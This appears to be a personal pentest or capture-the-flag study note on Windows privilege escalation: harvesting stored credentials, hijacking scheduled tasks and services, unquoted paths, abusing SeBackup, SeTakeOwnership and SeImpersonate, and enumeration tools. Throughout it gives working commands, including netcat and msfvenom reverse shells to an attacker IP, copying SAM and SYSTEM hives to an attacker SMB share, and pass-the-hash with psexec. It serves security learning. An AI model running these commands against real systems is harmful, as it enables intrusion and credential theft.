To start, escalation works in the with the same idea in mind. Windows systems mainly have two kinds of users.

| Users | Privileges |
| ---- | ---- |
| Administrators | These users have the most privileges. They can change any system configuration parameter and access any file in the system |
| Standard Users | These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files. |

In addition to that, there are some special built-in accounts used by the operating system in the context of privilege escalation:

| Users | Privileges |
| ---- | ---- |
| SYSTEM / LocalSystem | An account used by the operation system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
| Local Service | Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network. |
| Network Service | Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network. |
These accounts are created and managed by windows, and we won't be able to use them as other regular accounts.

# Active Directory


# Reaping Passwords
The easiest way to gain access to another user is to gather the credentials from a compromised machine (duh). For some careless people, leaving the credentials in the open is not a far fetched scenario, checking for plain text files, audio, images or even stored by some software like browsers or email clients.
## Unattended Windows Installations
When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't requiere users interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```
As part of these files, we may encounter credentials such as:
```
<Credentials>
    <Username>Administrator</Username>
    <Domain>you.tube</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

## Powershell history
Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe` prompt:
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
Note that this command will only work from cmd as Powershell wont't recognize `%userprofile%` as an environment variable. To read the file from Powershell, we'd have to replace it with `$Env:userprofile`

## Saved Windows Credentials
Windows allows us to use other user's credentials, this function also gives the option to save these credentials on the system. the command below will list saved credentials:
```
cmdkey /list
```
While we can't see the actual passwords, if we notice any credentials worth trying, we can use them with the `runas` command and the `/savecred` option:
```
runas /savecred /user:admin cmd.exe
```

## IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed versions of IIS, we can find web.config in one of the following locations:
```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
Here is a quick way to find database connection strings on the file:
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## Software: PuTTY
PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.
To retrieve the stored proxy credentials, we can search under the following registry key for ProxyPassword with the following command:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

Just as PuTTY stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

# Quick Ws
Misconfigurations are our best friends as always, in this case the following may be more CTF related but may also prove useful in real pentests. 
## Scheduled Tasks
Looking into scheduled tasks on the target system, we may encounter one that either lost its binary or is using one that we can modify to our advantage.
These can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services we can use a command like the following:
```
schtasks /query /tn vulntask /fo list /v
```
With this we can get a lot of information about the task, but what matters most to us is the "Task to Run" parameter which indicates the obvious, as well as the "Run As User" parameter, which again, indicates what it says. If we can modify the task to run exec, we can then change it for a payload that may result in escalation. 

To check file permissions on the executable, we use `icacls`. With this we can look for the `(F)` parameter which indicates full access as long as our user belongs to the corresponding group. `(M)` indicates modify. `(R)` Read. `(X)` Execute.

If yes, then we can proceed with our payload, this could be either executing an application to which the "run as user" has access to, or more directly creating a reverse shell (which needs the user to be able to run it, so worth checking that out first). As usual we can refer to [S(kull)hells](https://www.revshells.com) for quick reverse/bind shells. but using for example nc64 (netcat for windows) a quick payload could be:
```
c:\path\nc64.exe AtacckerIP PORT -e cmd.exe
```
Finally we need to wait for the next time the scheduled task runs, then we should receive the reverse shell. Normally (if well configured) we a random user shouldn't be able to trigger the task whenever, but if for some reason our user has that luck we could ran it manually with:
```
schtasks /run /tn vulntask
```

## Always Install Elevated
Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account. We could take advantage of this to generate a malicious MSI file that would run with admin privileges.

This method requires two registry values to be set.  We can query these from the command line using the commands below
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
To be able to exploit this vulnerability, both should be set. If they are, we can generate a malicious .msi file using [[Metasploit#Msfvenom|Msfvenom]], as seen below:
```Shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```
As this is a reverse shell we should preferably run the [[Metasploit]] handlser module configured accordingly. Once we have transferred the file we have created, we can run the installer with the command below and receive the reverse shell:
```
msiexec /quit /qn /i C:\Windows\Temp\malicious.msi
```

# Abusing Service Misconfigurations
Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.
To better understand the structure of a service we can use `sc qc SERVICE` to check it.
Here we can see that the associated executable is specified through the `BINARY_PATH_NAME` and the account used to run the service is shown on the `SERVICE_START_NAME` parameter.

Services have a Discretionary Access Control List (DACL), which indicates who has permissions to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from [[Process Hacker]]. 
All of the services configurations are stored on the registry under 
```
HKLM\SYSTEM\CurrentControlSet\Services\
```
We can check it with the **Registry Editor** app. A subkey exists for every service in the system. Here we can again see, values for things like the executable path as well as the account that the program will be ran as. If a DACL has been configured for the service, it will be stored in a subkey called **Security**. And yes, only administrators can modify such registry entries by default.
## Insecure Permission on Service Executable
If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account with relative ease.
To do this we can first query a service configuration using `sc`
```
sc qc SERVICE
```
Then using the path found on the **BINARY_PATH_NAME** check it for permissions using `icacls`
```
icacls c:\path\path\service.exe
```
Which will result in a list of permissions for different groups. What is mainly of our concern is both the `(F)` and `(M)` permissions to indicate that it is overwritable. We can then try to use [[Metasploit#Msfvenom|Msfvenom]] to craft a payload to gain a reverse shell like so
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_PORT LPORT=PORT -f exe-service -o rev-svc.exe
```
and then download the payload using something like a python server and `wget`

Once we have the payload in the windows server, we proceed to replace the service executable with our payload and change the permission so other users can execute the payload. Also, good practice to not remove the original payload if we mess up, we can instead do something like `move service.exe service.exe.bkp`. And then to change permissions 
```
icacls service.exe /grant Everyone:F
```
Finally we just need to start a listener service on our part. And restart the service so the executable can do it's job
```
sc stop SERVICE
sc start SERVICE
```
(if done in PowerShell, we need to use `sc.exe` as PowerShell uses `sc` as an alias to `Set-Content`)

## Unquoted Service Paths
When we can't directly write into service executables as before, there might still be a change to force a service into running arbitrary executables by using a rather obscure feature.
When working with Windows services a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. This occurs when the path of the associated executable isn't properly quoted to account for spaces on the command.
```bash
#good
BINARY_PATH_NAME    : "C:\MyPrograms\Real Folder Quoted\Service.exe"

#bad
BINARY_PATH_NAME    : C:\MyPrograms\Real Folder Unquoted\Service.exe
```
When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the binary path folder,  the command becomes ambiguous, and the SCM doesn't know which of the following we are trying to execute.

| Command | Argument 1 | Argument 2 |
| ---- | ---- | ---- |
| `C:\MyPrograms\Real.exe` | `Folder` | `Unquoted\Service.exe` |
| `C:\MyPrograms\Real Folder.exe` | `Unquoted\Service.exe` |  |
| `C:\MyPrograms\Real Folder Unquoted\Service.exe` |  |  |
This has to do with how the command prompt parses a command. Usually, when we send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute `C:\\MyPrograms\\Real.exe` and take the rest as arguments. Instead of failing it tries to search for each of the binaries in the order shown in the table until one works (normally the latter).
From this the problem is clear, if we create a binary which matches one of the "incomplete tries" we can force the service to run our code.
Although trivial many default folders already include spaces like `C:\Program Files` and `C:\Program Files (x86)`, so reading through services expecting one to be missing quotes and have spaces is not that farfetched. Taking this into account, theses two folders aren't writeable by default, but some installers may change the permissions on the installed folders making the services vulnerable.

From here the usual, craft payload (msfvenom or other), transfer it (python server), change permissions (`icacls payload.exe /grant Everyone:F)`), and restart service (`sc stop SERVICE; sc start SERVICE`).

## Insecure Service Permissions
Even if both the executable DACL is well configured, and the service's path is correctly quoted. Should the service DACL (not the service's executable DACL) allow us to modify the configuration of a service, we will be able to reconfigure the service. Allowing us to point to any executable we need and run it with any account we prefer, including SYSTEM itself.
To check for a service DACL from the command line, we can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite. Using it will look like
```powershell
accesschk64.exe -qlc Service
```
Here we usually care for the `BUILTIN\Users` group, or any other to which our user is a part of, and of course the access `SERVICE_ALL_ACCESS` which means that we can reconfigure the service

# Dangerous Privileges
Each account has privileges that allow it to perform specific system-related tasks. These tasks can be as  simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.
Each user has a set of assigned privileges that can be checked with the following command in the command prompt when ran as administrator:
```
whoami /priv
```
A complete list of available privileges on Windows system can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)  From an attacker's view, only those privileges that allow us to escalate in the system are of interest. For a comprehensive list of exploitable privileges refer to the [Priv2Admin](https://github.com/gtworek/Priv2Admin) github project.
Here we shall go over some of the most common privileges.

## SeBackup / SeRestore
The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea being that this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges. 
With this we can trivialize escalation on the system by using a variety of techniques. One of which consists on copying the SAM and SYSTEM registry hives to extract the local Administrator's passwords hash.
To do this we can use the following commands:
```
reg save hklm\system C:\Path\Tosave\system.hive
reg save hklm\sam C:\Path\Tosave\sam.hive
```
Which will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using [[SMB]] or any other available method. For SMB, we can use [[impacket]]'s `smbserver.py` to start a simple SMB server with a network share in the current directory of our attacking machine.
```sh
mkdir share

python3.9 /opt/impacket/examples/smbserver.py -smb2support -username USER -password PASS public share
```
This will create a share named `public` to the `share` directory, which requires the username and password of our current windows session. After this, we can use the `copy` command on the windows machine to transfer both files to our AttackBox
```
copy C:\Path\Tosave\sam.hive \\AtacckerIP\public\
copy C:\Path\Tosave\system.hive \\AtacckerIP\public\
```
And then use [[impacket]] to retrieve the user's password hashes
```sh
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```
And finally we can use the Administrator or other user's hash to perform a Pass-the-Hash attack with [[impacket]] and gain access to the target machine.
```sh
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 USER@IP
```

## SeTakeOwnership
The SeTakeOwnership allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as System and take ownership of the service's executable. Another route is the one we are gonna cover however.

We will abuse `utilman.exe` to escalate privileges this time. It is a built-in windows application used to provide Ease of Access options during the lock screen. Since utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file replacing it is trivial.
To accomplish this, we will start by taking ownership with the following command
```
takeown /f C:\Windows\System32\Utilman.exe
```
Now we can grant us all the privileges over it
```
icacls C:\Windows\System32\Utilman.exe /grant USER:F
```
After this we can replace utilman.exe with a copy of cmd.exe
```
copy cmd.exe utilman.exe
```
To now trigger it, we can lock our screen from the start button, and when prompted with the login page, we can proceed to click on the "Ease of Access" button in the down-right corner.
Note that when opening the cmd we may only be able to run built-in commands, but we can then try to use certain applications to gain some more footholding, read or even edit files. One example is running notepad.exe to read and edit .txt files.

## SeImpersonate / SeAssignPrimaryToken
These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
As attackers, if we manage to take control of a process with `SeImpersonate` or `SeAssignPrimaryToken` privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, we will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. **Internet Information Services** (IIS) will also create a similar default account called `iis apppool\defaultapppool` for web applications.

To elevate privileges using such accounts, we need the following: 
1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 
2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.
We can use [[RogueWinRM]] to accomplish both conditions. Assuming we already have compromised a website running on IIS and that a we have planted a webshell on that address. 
We can use the webshell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest.
To use [[RogueWinRM]], we first need to upload the exploit to the target machine. 

The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.
If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell. And then we can trigger the exploit using the following in the webshell
```
c:\RogueFolder\RogueWinRM.exe -p "C:\CatFolder\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```
This will essentially execute the RogueWinRM.exe, starting a fake WinRM and impersonate the SYSTEM user, then executing nc64.exe (`-p`) and passing the arguments that it needs to spawn a shell and connect (`-a`)


# Vulnerable Software
## Unpatched Software
The holy grail, just as with drivers, organisations and users may not update them as often as they update the operating system. We can use the `wmic` tool to list software installed on the target system and its versions. The following command will dump information it can gather on installed software
```
wmic product get name,version,vendor
```
This command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. That's why it is important to also check desktop shortcuts, "App & browser control" in windows security, installed apps in config, available services or generally any trace that indicates the existence of additional software that might be vulnerable.
Once we have gathered product version info, we can search for existing exploits on sites like [exploit-db](https://www.exploit-db.com/) 

# Enumeration
Several scripts exist to conduct system enumeration, these tools shorten the enumeration process time and uncover different potential privilege escalation vectors. However, these can sometimes miss routes, so checking manually is always worthwhile.
## WinPEAS
WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. For info and download refer to [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS). It will run commands similar to previous methods and print their output, as this can be rather lengthy it is always good practice to redirect it.
```
winpeas.exe > output.txt
```

## PrivescCheck
PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file. Info and download [PrivescCheck](https://github.com/itm4n/PrivescCheck).
To be able to run it, we may need to bypass the execution policy restrictions. To do this we can use 
```Powershell
Set-ExecutionPolicy Bypass -Scope process -Force 
. .\PrivescCheck.ps1 
Invoke-PrivescCheck
```
## WES-NG
Some exploit suggesting scripts like WinPEAS will requiere us to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid alerting and be more ninja-like we can use Windows Exploit Suggester - Next Generation (WES-NG), which will run on our attacking machine.
WES-NG is a Python script that can be found and downloaded [here](https://github.com/bitsadmin/wesng).
Once installed, and before using it, we can enter `wes.py --update` to update the database. Checking for missing patches that can result in a vulnerability we can use to escalate.
To run the script we need to run the `systeminfo` command on the target system. We can then take the output from it and give it to WES-NG as an argument like so
```sh
wes.py sysinfo.txt
```

## Metasploit
The holy fucking grail
If we already have a Meterpreter shell on the target system we can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow us to elevate privileges on the target system.
## PowerUp
"_PowerUp aims to be a clearinghouse of common Windows privilege escalation_ _vectors that rely on misconfigurations._"
We can download the script for powershell [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)

# Referrals
- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Priv2Admin - Abusing Windows Privileges](https://github.com/gtworek/Priv2Admin)
- [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM)
- [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
- [Decoder's Blog](https://decoder.cloud/)
- [Token Kidnapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
- [Hacktricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [LOLBAS](https://lolbas-project.github.io)
- [LOLDrivers](https://www.loldrivers.io)
- [WADComs](https://wadcoms.github.io)